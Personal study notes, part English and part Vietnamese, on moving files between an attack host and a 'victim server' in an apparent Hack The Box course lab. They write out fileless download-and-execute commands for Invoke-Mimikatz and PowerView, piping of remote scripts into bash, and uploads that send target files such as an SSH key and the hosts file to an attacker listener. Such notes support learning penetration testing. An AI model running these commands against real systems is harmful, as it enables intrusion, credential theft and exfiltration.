File Transfers

How many ways are there to transfer files to the victim server?

////////////////////////////////////////////////////////////

By SMB 


Impacket smbserver : https://github.com/fortra/impacket/blob/master/examples/smbserver.py


The Astaroth attack generally followed these steps: A malicious link in a spear-phishing email led to an LNK file. When double-clicked, the LNK file caused the execution of the WMIC tool with the "/Format" parameter, which allowed the download and execution of malicious JavaScript code. The JavaScript code, in turn, downloads payloads by abusing the Bitsadmin tool. ( https://academy.hackthebox.com/module/24/section/160 ) 

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

Base64

  Base64 file shell in source marchine, copy to victim server and decode to recover file shell. 

  Check hash MD5, Lệnh này tính MD5 hash của file id_rsa (File id_rsa trên Linux là một khóa riêng(private key) trong hệ thống xác thực SSH(Secure Shell)).
    md5sum id_rsa
  
  Encode file to base64 
    cat id_rsa | base64 -w 0; echo
  
      cat id_rsa đọc nội dung file.
      base64 -w 0 mã hóa sang chuỗi Base64 và -w 0 để không xuống dòng.
      ; echo thêm một newline cuối để tiện copy.
      Kết quả là một chuỗi Base64 rất dài (nội dung file đã mã hóa).
  
  Paste base64 to powershell 
    [IO.File]::WriteAllBytes("C:\Users\Public\id_rsa",[Convert]::FromBase64String("<REPLACE_RESULT_BASE64_ABOVE>"))
  
    example : PS C:\htb> [IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNHRUcxcHpJbmtiN2hIMldRVGpMQWRYZE9kCno3YjJtd0tiSW56VmtTM1BUR3ZseGhDVkRRUmpBYzloQ3k1Q0duWnlLM3U2TjQ3RFhURFY0YUtkcXl0UTFUQXZZUHQwWm8KVWh2bEo5YUgxclgzVHUxM2FRWUNQTVdMc2JOV2tLWFJzSk11dTJONkJoRHVmQThhc0FBQUlRRGJXa3p3MjFwTThBQUFBSApjM05vTFhKellRQUFBSUVBeloxNHc1dTVPZWh0eUlCUEpIN05vWGovOGFzR0VHMXB6SW5rYjdoSDJXUVRqTEFkWGRPZHo3CmIybXdLYkluelZrUzNQVEd2bHhoQ1ZEUVJqQWM5aEN5NUNHblp5SzN1Nk40N0RYVERWNGFLZHF5dFExVEF2WVB0MFpvVWgKdmxKOWFIMXJYM1R1MTNhUVlDUE1XTHNiTldrS1hSc0pNdXUyTjZCaER1ZkE4YXNBQUFBREFRQUJBQUFBZ0NjQ28zRHBVSwpFdCtmWTZjY21JelZhL2NEL1hwTlRsRFZlaktkWVFib0ZPUFc5SjBxaUVoOEpyQWlxeXVlQTNNd1hTWFN3d3BHMkpvOTNPCllVSnNxQXB4NlBxbFF6K3hKNjZEdzl5RWF1RTA5OXpodEtpK0pvMkttVzJzVENkbm92Y3BiK3Q3S2lPcHlwYndFZ0dJWVkKZW9VT2hENVJyY2s5Q3J2TlFBem9BeEFBQUFRUUNGKzBtTXJraklXL09lc3lJRC9JQzJNRGNuNTI0S2NORUZ0NUk5b0ZJMApDcmdYNmNoSlNiVWJsVXFqVEx4NmIyblNmSlVWS3pUMXRCVk1tWEZ4Vit0K0FBQUFRUURzbGZwMnJzVTdtaVMyQnhXWjBNCjY2OEhxblp1SWc3WjVLUnFrK1hqWkdqbHVJMkxjalRKZEd4Z0VBanhuZEJqa0F0MExlOFphbUt5blV2aGU3ekkzL0FBQUEKUVFEZWZPSVFNZnQ0R1NtaERreWJtbG1IQXRkMUdYVitOQTRGNXQ0UExZYzZOYWRIc0JTWDJWN0liaFA1cS9yVm5tVHJRZApaUkVJTW84NzRMUkJrY0FqUlZBQUFBRkhCc1lXbHVkR1Y0ZEVCamVXSmxjbk53WVdObEFRSURCQVVHCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo="))
  
    [Convert]::FromBase64String() chuyển chuỗi Base64 về mảng byte.
    [IO.File]::WriteAllBytes() ghi mảng byte đó thành file id_rsa ở C:\Users\Public\.
  
  Confirming the MD5 Hashes Match
    PS C:\htb> Get-FileHash C:\Users\Public\id_rsa -Algorithm md5

DONE ! 


////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////


PowerShell Web Downloads

Most company allow HTTP and HTTPS (or HTTPS only). But some company just allow whitelist domain.

powershell offer many file transfer option. in any version of PowerShell, the System.Net.WebClient class can be used to download file HTTP, HTTPS or FTP 

Method              Description
OpenRead	          Returns the data from a resource as a Stream.
OpenReadAsync	      Returns the data from a resource without blocking the calling thread.
DownloadData	      Downloads data from a resource and returns a Byte array.
DownloadDataAsync  	Downloads data from a resource and returns a Byte array without blocking the calling thread.
DownloadFile	      Downloads data from a resource to a local file.
DownloadFileAsync  	Downloads data from a resource to a local file without blocking the calling thread.
DownloadString	    Downloads a String from a resource and returns a String.
DownloadStringAsync	Downloads a String from a resource without blocking the calling thread.



Example : 
  PS C:\htb> # Example: (New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')
  PS C:\htb> (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1')
  
  PS C:\htb> # Example: (New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')
  PS C:\htb> (New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1', 'C:\Users\Public\Downloads\PowerViewAsync.ps1')

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

PowerShell DownloadString - Fileless Method

Like the name. Fileless 
Download payload and excute it without save file
Instead of downloading a PowerShell script to disk, we can run it directly in memory using the Invoke-Expression cmdlet or the alias IEX.

  example : PS C:\htb> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')

IEX also accepts pipeline input.
  example : PS C:\htb> (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

PowerShell Invoke-WebRequest

From Powershell 3.0 onward, the Invoke-WebRequest is available, but it is noticeably slower at downloading files.
Nói chung nó ngon hơn PowerShell Web Downloads( Net.WebClient) ở trên

  example : PS C:\htb> Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

SMB Downloads

Đứng từ windown 
  C:\htb> copy \\192.168.220.133\share\nc.exe
          1 file(s) copied.
      => Khoan, cuộc sống không dễ dàng với bạn như vậy. New version of Windows block unauthenticated guest access.
  C:\htb> copy \\192.168.220.133\share\nc.exe
  You can't access this shared folder because your organization's security policies block unauthenticated guest access. These policies help protect your PC from unsafe or malicious devices on the network.
To transfer files in the scenario, we need set username/password using our impacket SMB and mount the SMB server on our windows target machine 
Create the SMB Server with a Username and Password
  naruto3co@htb[/htb]$ sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
    Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
    [*] Config file parsed
    [*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
    [*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
    [*] Config file parsed
    [*] Config file parsed
    [*] Config file parsed

Mount the SMB Server with Username and Password
  C:\htb> net use n: \\192.168.220.133\share /user:test test
  The command completed successfully.
  C:\htb> copy n:\nc.exe
          1 file(s) copied.

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

Installing the FTP Server Python3 Module - pyftpdlib

  example : naruto3co@htb[/htb]$ sudo pip3 install pyftpdlib

By default, pyftpdlib using port 2121. Anonymous authentication 

Setting up a Python3 FTP Server
  naruto3co@htb[/htb]$ sudo python3 -m pyftpdlib --port 21
    [I 2022-05-17 10:09:19] concurrency model: async
    [I 2022-05-17 10:09:19] masquerade (NAT) address: None
    [I 2022-05-17 10:09:19] passive ports: None
    [I 2022-05-17 10:09:19] >>> starting FTP server on 0.0.0.0:21, pid=3210 <<<


Transferring Files from an FTP Server Using PowerShell
  Example PS C:\htb> (New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')

We can make script do that 
    C:\htb> echo open 192.168.49.128 > ftpcommand.txt
    C:\htb> echo USER anonymous >> ftpcommand.txt
    C:\htb> echo binary >> ftpcommand.txt
    C:\htb> echo GET file.txt >> ftpcommand.txt
    C:\htb> echo bye >> ftpcommand.txt
    C:\htb> ftp -v -n -s:ftpcommand.txt
    ftp> open 192.168.49.128
    Log in with USER and PASS first.
    ftp> USER anonymous
    
    ftp> GET file.txt
    ftp> bye
    
    C:\htb>more file.txt
    This is a test file


////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

Upload Operations


There are also situations such as password cracking, analysis, exfiltration, etc., where we must upload files from our target machine into our attack host. We can use the same methods we used for download operation but now for uploads. Let's see how we can accomplish uploading files in various ways.


PowerShell Base64 Encode & Decode
  Reverse operation and encode a file so we can decode it on our attack host.

Encode File Using PowerShell
  PS C:\htb> [Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))
  IyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwOSBNaWNyb3NvZnQgQ29ycC4NCiMNCiMgVGhpcyBpcyBhIHNhbXBsZSBIT1NUUyBmaWxlIHVzZWQgYnkgTWljcm9zb2Z0IFRDUC9JUCBmb3IgV2luZG93cy4NCiMNCiMgVGhpcyBmaWxlIGNvbnRhaW5zIHRoZSBtYXBwaW5ncyBvZiBJUCBhZGRyZXNzZXMgdG8gaG9zdCBuYW1lcy4gRWFjaA0KIyBlbnRyeSBzaG91bGQgYmUga2VwdCBvbiBhbiBpbmRpdmlkdWFsIGxpbmUuIFRoZSBJUCBhZGRyZXNzIHNob3VsZA0KIyBiZSBwbGFjZWQgaW4gdGhlIGZpcnN0IGNvbHVtbiBmb2xsb3dlZCBieSB0aGUgY29ycmVzcG9uZGluZyBob3N0IG5hbWUuDQojIFRoZSBJUCBhZGRyZXNzIGFuZCB0aGUgaG9zdCBuYW1lIHNob3VsZCBiZSBzZXBhcmF0ZWQgYnkgYXQgbGVhc3Qgb25lDQojIHNwYWNlLg0KIw0KIyBBZGRpdGlvbmFsbHksIGNvbW1lbnRzIChzdWNoIGFzIHRoZXNlKSBtYXkgYmUgaW5zZXJ0ZWQgb24gaW5kaXZpZHVhbA0KIyBsaW5lcyBvciBmb2xsb3dpbmcgdGhlIG1hY2hpbmUgbmFtZSBkZW5vdGVkIGJ5IGEgJyMnIHN5bWJvbC4NCiMNCiMgRm9yIGV4YW1wbGU6DQojDQojICAgICAgMTAyLjU0Ljk0Ljk3ICAgICByaGluby5hY21lLmNvbSAgICAgICAgICAjIHNvdXJjZSBzZXJ2ZXINCiMgICAgICAgMzguMjUuNjMuMTAgICAgIHguYWNtZS5jb20gICAgICAgICAgICAgICMgeCBjbGllbnQgaG9zdA0KDQojIGxvY2FsaG9zdCBuYW1lIHJlc29sdXRpb24gaXMgaGFuZGxlZCB3aXRoaW4gRE5TIGl0c2VsZi4NCiMJMTI3LjAuMC4xICAgICAgIGxvY2FsaG9zdA0KIwk6OjEgICAgICAgICAgICAgbG9jYWxob3N0DQo=
  PS C:\htb> Get-FileHash "C:\Windows\system32\drivers\etc\hosts" -Algorithm MD5 | select Hash
  Hash
  ----
  3688374325B992DEF12793500307566D

Decode file 
  Decode Base64 String in Linux
  naruto3co@htb[/htb]$ echo IyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwOSBNaWNyb3NvZnQgQ29ycC4NCiMNCiMgVGhpcyBpcyBhIHNhbXBsZSBIT1NUUyBmaWxlIHVzZWQgYnkgTWljcm9zb2Z0IFRDUC9JUCBmb3IgV2luZG93cy4NCiMNCiMgVGhpcyBmaWxlIGNvbnRhaW5zIHRoZSBtYXBwaW5ncyBvZiBJUCBhZGRyZXNzZXMgdG8gaG9zdCBuYW1lcy4gRWFjaA0KIyBlbnRyeSBzaG91bGQgYmUga2VwdCBvbiBhbiBpbmRpdmlkdWFsIGxpbmUuIFRoZSBJUCBhZGRyZXNzIHNob3VsZA0KIyBiZSBwbGFjZWQgaW4gdGhlIGZpcnN0IGNvbHVtbiBmb2xsb3dlZCBieSB0aGUgY29ycmVzcG9uZGluZyBob3N0IG5hbWUuDQojIFRoZSBJUCBhZGRyZXNzIGFuZCB0aGUgaG9zdCBuYW1lIHNob3VsZCBiZSBzZXBhcmF0ZWQgYnkgYXQgbGVhc3Qgb25lDQojIHNwYWNlLg0KIw0KIyBBZGRpdGlvbmFsbHksIGNvbW1lbnRzIChzdWNoIGFzIHRoZXNlKSBtYXkgYmUgaW5zZXJ0ZWQgb24gaW5kaXZpZHVhbA0KIyBsaW5lcyBvciBmb2xsb3dpbmcgdGhlIG1hY2hpbmUgbmFtZSBkZW5vdGVkIGJ5IGEgJyMnIHN5bWJvbC4NCiMNCiMgRm9yIGV4YW1wbGU6DQojDQojICAgICAgMTAyLjU0Ljk0Ljk3ICAgICByaGluby5hY21lLmNvbSAgICAgICAgICAjIHNvdXJjZSBzZXJ2ZXINCiMgICAgICAgMzguMjUuNjMuMTAgICAgIHguYWNtZS5jb20gICAgICAgICAgICAgICMgeCBjbGllbnQgaG9zdA0KDQojIGxvY2FsaG9zdCBuYW1lIHJlc29sdXRpb24gaXMgaGFuZGxlZCB3aXRoaW4gRE5TIGl0c2VsZi4NCiMJMTI3LjAuMC4xICAgICAgIGxvY2FsaG9zdA0KIwk6OjEgICAgICAgICAgICAgbG9jYWxob3N0DQo= | base64 -d > hosts
  
  
  naruto3co@htb[/htb]$ md5sum hosts 
  3688374325b992def12793500307566d  hosts

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

PowerShell Web Uploads

Trực tiếp Powershell không có hàm upload nhưng nó thề là nền móng viết lên hàm upload bằng ivnvoke-WebRequest hoặc Invoke-RestMethod
We'll also need a web server that accepts uploads, which is not a default option in most common webserver utilities. ( ý này mình chưa clear lắm, cần thực hành để hiểu được) nhưng có thể dùng python http.server để làm server

Installing a Configured WebServer with Upload
  naruto3co@htb[/htb]$ pip3 install uploadserver
    Collecting upload server
      Using cached uploadserver-2.0.1-py3-none-any.whl (6.9 kB)
    Installing collected packages: uploadserver
    Successfully installed uploadserver-2.0.1

  naruto3co@htb[/htb]$ python3 -m uploadserver
    File upload available at /upload
    Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...


Giờ ta có thể sử dụng Powershell dùng invoke-RestMethod để thực hiện upload file hệ thống. Script cho phép 2 tham số -File và -Uri 

  PS C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
  PS C:\htb> Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts
  
  [+] File Uploaded:  C:\Windows\System32\drivers\etc\hosts
  [+] FileHash:  5E7241D66FD77E9E8EA866B6278B2373

Another way..... 

PowerShell + base64 encode file 
  Condition : using Invoke or Invoke RestMethod  + Netcat 
              ( use Netcat listen port specify and send file as POST request)

Victim
  PS C:\htb> $b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
  PS C:\htb> Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64

Attacker
  naruto3co@htb[/htb]$ nc -lvnp 8000
  
  listening on [any] 8000 ...
  connect to [192.168.49.128] from (UNKNOWN) [192.168.49.129] 50923
  POST / HTTP/1.1
  User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.19041.1682
  Content-Type: application/x-www-form-urlencoded
  Host: 192.168.49.128:8000
  Content-Length: 1820
  Connection: Keep-Alive
         IyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwOSBNaWNyb3NvZnQgQ29ycC4NCiMNCiMgVGhpcyBpcyBhIHNhbXBsZSBIT1NUUyBmaWxlIHVzZWQgYnkgTWljcm9zb2Z0IFRDUC9JUCBmb3IgV2luZG93cy4NCiMNCiMgVGhpcyBmaWxlIGNvbnRhaW5zIHRoZSBtYXBwaW5ncyBvZiBJUCBhZGRyZXNzZXMgdG8gaG9zdCBuYW1lcy4gRWFjaA0KIyBlbnRyeSBzaG91bGQgYmUga2VwdCBvbiBhbiBpbmRpdmlkdWFsIGxpbmUuIFRoZSBJUCBhZGRyZXNzIHNob3VsZA0KIyBiZSBwbGFjZWQgaW4gdGhlIGZpcnN0IGNvbHVtbiBmb2xsb3dlZCBieSB0aGUgY29ycmVzcG9uZGluZyBob3N0IG5hbWUuDQojIFRoZSBJUCBhZGRyZXNzIGFuZCB0aGUgaG9zdCBuYW1lIHNob3VsZCBiZSBzZXBhcmF0ZWQgYnkgYXQgbGVhc3Qgb25lDQo
    ...SNIP...

  naruto3co@htb[/htb]$ echo <base64> | base64 -d -w 0 > hosts

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

Tất nhiên rồi , cứ nhắc đến chuyển file méo gì ông em SMB cũng dính dáng 

SMB Uploads  

Các công ty thường chỉ open port 80 và 443 outbound chứ k dùng SMB 445. Theo bài viết của microsoft (https://support.microsoft.com/en-us/topic/preventing-smb-traffic-from-lateral-connections-and-entering-or-leaving-the-network-c0541db7-2244-0dce-18fd-14a3ddeb282a)

Vậy giải pháp thay thế là SMB trên port 80 hoặc 443 bằng cách WebDav.WevDAV ( https://datatracker.ietf.org/doc/html/rfc4918 ) Nó là extension của HTTP. WebDAV cho phép webserver có khả năng giống như file server dùng trên HTTP và cả HTTPS 

Khi dùng SMB, điều đầu tiên cần làm là kết nối tới phương thức SMB và nếu k tồn tại SMB share. Có thể thử dùng HTTP cho phép Wireshark capture,  và chỉ thấy đang dùng giao thức HTTP thay vì SMB ( cái này tôi méo hiểu lắm nhưng ae nên xem hình ) 

Cấu hình WebDav server 



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

Giờ tôi mệt cái module này vãi , đây là module thứ 2 của CPTS, Nhiều thứ mới để học theo từng khâu, tôi hiểu là bố HTB muốn con học nhiều nhưng mà chương này hơi nản. 1h42 sáng rồi chơi game xong ngồi học cái "Fai tràn phơ rừn =)" 


Linux File Transfer Methods

  Linux có nhiều công cụ để truyền tải file, thường dùng trong cả tấn công và phòng thủ.
  Trong một sự cố IR, phát hiện nhiều web server bị tấn công thông qua lỗ hổng SQL Injection.
  Kẻ tấn công dùng Bash script để tải malware kết nối về C2 server.
  Script thử lần lượt 3 cách tải file: cURL → wget → Python, tất cả đều qua HTTP.
  Dù Linux hỗ trợ nhiều giao thức (FTP, SMB), phần lớn malware (trên mọi HĐH) dùng HTTP/HTTPS.
  Chương này sẽ trình bày nhiều cách truyền file trong Linux: HTTP, Bash, SSH, …


Base64 Encoding / Decoding

  naruto3co@htb[/htb]$ md5sum id_rsa
    4e301756a07ded0a2dd6953abf015278  id_rsa

  naruto3co@htb[/htb]$ cat id_rsa |base64 -w 0;echo
    LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNHRUcxcHpJbmtiN2hIMldRVGpMQWRYZE9kCno3YjJtd0tiSW56VmtTM1BUR3ZseGhDVkRRUmpBYzloQ3k1Q0duWnlLM3U2TjQ3RFhURFY0YUtkcXl0UTFUQXZZUHQwWm8KVWh2bEo5YUgxclgzVHUxM2FRWUNQTVdMc2JOV2tLWFJzSk11dTJONkJoRHVmQThhc0FBQUlRRGJXa3p3MjFwTThBQUFBSApjM05vTFhKellRQUFBSUVBeloxNHc1dTVPZWh0eUlCUEpIN05vWGovOGFzR0VHMXB6SW5rYjdoSDJXUVRqTEFkWGRPZHo3CmIybXdLYkluelZrUzNQVEd2bHhoQ1ZEUVJqQWM5aEN5NUNHblp5SzN1Nk40N0RYVERWNGFLZHF5dFExVEF2WVB0MFpvVWgKdmxKOWFIMXJYM1R1MTNhUVlDUE1XTHNiTldrS1hSc0pNdXUyTjZCaER1ZkE4YXNBQUFBREFRQUJBQUFBZ0NjQ28zRHBVSwpFdCtmWTZjY21JelZhL2NEL1hwTlRsRFZlaktkWVFib0ZPUFc5SjBxaUVoOEpyQWlxeXVlQTNNd1hTWFN3d3BHMkpvOTNPCllVSnNxQXB4NlBxbFF6K3hKNjZEdzl5RWF1RTA5OXpodEtpK0pvMkttVzJzVENkbm92Y3BiK3Q3S2lPcHlwYndFZ0dJWVkKZW9VT2hENVJyY2s5Q3J2TlFBem9BeEFBQUFRUUNGKzBtTXJraklXL09lc3lJRC9JQzJNRGNuNTI0S2NORUZ0NUk5b0ZJMApDcmdYNmNoSlNiVWJsVXFqVEx4NmIyblNmSlVWS3pUMXRCVk1tWEZ4Vit0K0FBQUFRUURzbGZwMnJzVTdtaVMyQnhXWjBNCjY2OEhxblp1SWc3WjVLUnFrK1hqWkdqbHVJMkxjalRKZEd4Z0VBanhuZEJqa0F0MExlOFphbUt5blV2aGU3ekkzL0FBQUEKUVFEZWZPSVFNZnQ0R1NtaERreWJtbG1IQXRkMUdYVitOQTRGNXQ0UExZYzZOYWRIc0JTWDJWN0liaFA1cS9yVm5tVHJRZApaUkVJTW84NzRMUkJrY0FqUlZBQUFBRkhCc1lXbHVkR1Y0ZEVCamVXSmxjbk53WVdObEFRSURCQVVHCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo=

We copy this content, paste it onto our Linux target machine, and use base64 with the option `-d' to decode it.

  naruto3co@htb[/htb]$ echo -n 'LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNHRUcxcHpJbmtiN2hIMldRVGpMQWRYZE9kCno3YjJtd0tiSW56VmtTM1BUR3ZseGhDVkRRUmpBYzloQ3k1Q0duWnlLM3U2TjQ3RFhURFY0YUtkcXl0UTFUQXZZUHQwWm8KVWh2bEo5YUgxclgzVHUxM2FRWUNQTVdMc2JOV2tLWFJzSk11dTJONkJoRHVmQThhc0FBQUlRRGJXa3p3MjFwTThBQUFBSApjM05vTFhKellRQUFBSUVBeloxNHc1dTVPZWh0eUlCUEpIN05vWGovOGFzR0VHMXB6SW5rYjdoSDJXUVRqTEFkWGRPZHo3CmIybXdLYkluelZrUzNQVEd2bHhoQ1ZEUVJqQWM5aEN5NUNHblp5SzN1Nk40N0RYVERWNGFLZHF5dFExVEF2WVB0MFpvVWgKdmxKOWFIMXJYM1R1MTNhUVlDUE1XTHNiTldrS1hSc0pNdXUyTjZCaER1ZkE4YXNBQUFBREFRQUJBQUFBZ0NjQ28zRHBVSwpFdCtmWTZjY21JelZhL2NEL1hwTlRsRFZlaktkWVFib0ZPUFc5SjBxaUVoOEpyQWlxeXVlQTNNd1hTWFN3d3BHMkpvOTNPCllVSnNxQXB4NlBxbFF6K3hKNjZEdzl5RWF1RTA5OXpodEtpK0pvMkttVzJzVENkbm92Y3BiK3Q3S2lPcHlwYndFZ0dJWVkKZW9VT2hENVJyY2s5Q3J2TlFBem9BeEFBQUFRUUNGKzBtTXJraklXL09lc3lJRC9JQzJNRGNuNTI0S2NORUZ0NUk5b0ZJMApDcmdYNmNoSlNiVWJsVXFqVEx4NmIyblNmSlVWS3pUMXRCVk1tWEZ4Vit0K0FBQUFRUURzbGZwMnJzVTdtaVMyQnhXWjBNCjY2OEhxblp1SWc3WjVLUnFrK1hqWkdqbHVJMkxjalRKZEd4Z0VBanhuZEJqa0F0MExlOFphbUt5blV2aGU3ekkzL0FBQUEKUVFEZWZPSVFNZnQ0R1NtaERreWJtbG1IQXRkMUdYVitOQTRGNXQ0UExZYzZOYWRIc0JTWDJWN0liaFA1cS9yVm5tVHJRZApaUkVJTW84NzRMUkJrY0FqUlZBQUFBRkhCc1lXbHVkR1Y0ZEVCamVXSmxjbk53WVdObEFRSURCQVVHCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo=' | base64 -d > id_rsa

Finally, we can confirm if the file was transferred successfully using the md5sum command.
  naruto3co@htb[/htb]$ md5sum id_rsa
    4e301756a07ded0a2dd6953abf015278  id_rsa

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

Web Downloads with Wget and cURL

Như tên thôi 

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

Fileless Attacks Using Linux

Tấn công không tệp sử dụng Linux
Do cách thức hoạt động của Linux và cách thức hoạt động của các đường ống, hầu hết các công cụ chúng ta sử dụng trong Linux đều có thể được sử dụng để sao chép các hoạt động không tệp, nghĩa là chúng ta không cần phải tải xuống tệp để thực thi.

Lưu ý: Một số payload như mkfifo ghi tệp vào đĩa. Lưu ý rằng mặc dù việc thực thi payload có thể không cần tệp khi bạn sử dụng pipe, nhưng tùy thuộc vào payload được chọn, nó có thể tạo ra các tệp tạm thời trên hệ điều hành.

Hãy sử dụng lệnh cURL mà chúng ta đã dùng và thay vì tải xuống LinEnum.sh, hãy thực thi trực tiếp lệnh này bằng lệnh pipe.

  naruto3co@htb[/htb]$ curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
or
  naruto3co@htb[/htb]$ wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3  
    Hello World!

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////


Download with Bash (/dev/tcp)

Connect to the Target Webserver

  naruto3co@htb[/htb]$ exec 3<>/dev/tcp/10.10.10.32/80

HTTP GET Request
  naruto3co@htb[/htb]$ echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3

Print the Response
  naruto3co@htb[/htb]$ cat <&3

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

SSH Downloads

tất nhiên cái SSH ở module File transfers này thì là SCP rồi 

Enabling the SSH Server
  naruto3co@htb[/htb]$ sudo systemctl enable ssh
  Synchronizing state of ssh.service with SysV service script with /lib/systemd/systemd-sysv-install.
  Executing: /lib/systemd/systemd-sysv-install enable ssh
  Use of uninitialized value $service in hash element at /usr/sbin/update-rc.d line 26, <DATA> line 45
  ...SNIP...

Starting the SSH Server
  naruto3co@htb[/htb]$ sudo systemctl start ssh

Checking for SSH Listening Port
  naruto3co@htb[/htb]$ netstat -lnpt 
    (Not all processes could be identified, non-owned process info
     will not be shown, you would have to be root to see it all.)
    Active Internet connections (only servers)
    Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
    tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      - 


Now we can begin transferring files. We need to specify the IP address of our Pwnbox and the username and password.

  naruto3co@htb[/htb]$ scp plaintext@192.168.49.128:/root/myroot.txt . 


////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

Web Upload

Pwnbox - Start Web Server

  naruto3co@htb[/htb]$ sudo python3 -m pip install --user uploadserver
    Collecting uploadserver
      Using cached uploadserver-2.0.1-py3-none-any.whl (6.9 kB)
    Installing collected packages: uploadserver
    Successfully installed uploadserver-2.0.1
  
  naruto3co@htb[/htb]$ openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
    Generating a RSA private key
    ................................................................................+++++
    .......+++++
    writing new private key to 'server.pem'
